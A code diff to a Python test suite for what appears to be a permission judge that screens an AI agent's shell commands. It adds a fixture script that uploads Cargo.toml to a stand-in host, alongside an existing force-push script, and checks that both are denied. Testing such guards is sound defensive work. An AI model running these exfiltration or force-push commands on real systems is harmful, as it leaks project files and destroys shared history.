@@ -38,7 +38,7 @@ class Model(BaseHTTPRequestHandler):
             self.send_header('Content-Length', '0')
             self.end_headers()
             return
-        action = body['messages'][0]['content'].split('Command:\n', 1)[1].rsplit('\nAnswer with', 1)[0]
+        action = body['messages'][0]['content'].split('Command:\n', 1)[1].rsplit('\nAnswer with', 1)[0].split('\nScript sources this command runs:', 1)[0]
         if action == 'curl slow':
             time.sleep(1)
         if action == 'curl chunked':
@@ -182,6 +182,7 @@ class JudgeTests(unittest.TestCase):
             self.timeout = 30
             self.start()
         (self.wt / 'push.sh').write_text('#!/bin/sh\ngit push --force origin HEAD:main\n')
+        (self.wt / 'upload.py').write_text('import urllib.request\nurllib.request.urlopen(urllib.request.Request("https://example.com", data=open("Cargo.toml", "rb").read()))\n')
         counts = {}
         for case in CASES:
             tin = dict(case['input'])
@@ -197,7 +198,7 @@ class JudgeTests(unittest.TestCase):
                     expected = case['decision']
                 self.assertEqual(self.ruling(case['tool'], tin), expected)
                 counts[case['kind']] = counts.get(case['kind'], 0) + 1
-        self.assertEqual([counts[k] for k in ('must-deny', 'must-allow', 'should-allow')], [36, 26, 6])
+        self.assertEqual([counts[k] for k in ('must-deny', 'must-allow', 'should-allow')], [38, 26, 6])
         if not os.environ.get('SM_JUDGE_TEST_MODEL_URL'):
             self.assertGreater(len(self.model.requests), 40)
             request = self.model.requests[0]
@@ -303,6 +304,8 @@ class JudgeTests(unittest.TestCase):
                 self.assertEqual(self.ruling(tin={'command': command}), 'deny')
                 self.assertEqual(self.logs()[-1]['stage'], 'judge')
                 self.assertIn('interpreted-program', self.logs()[-1]['judge_why'])
+                shown = self.model.requests[-1]['messages'][0]['content']
+                self.assertIn('data=open("Cargo.toml"' if 'upload.py' in command else 'no script file could be shown', shown)
 
     def test_git_control_metadata_cannot_be_written(self):
         (self.wt / 'config-link').symlink_to(self.wt / '.git/config')
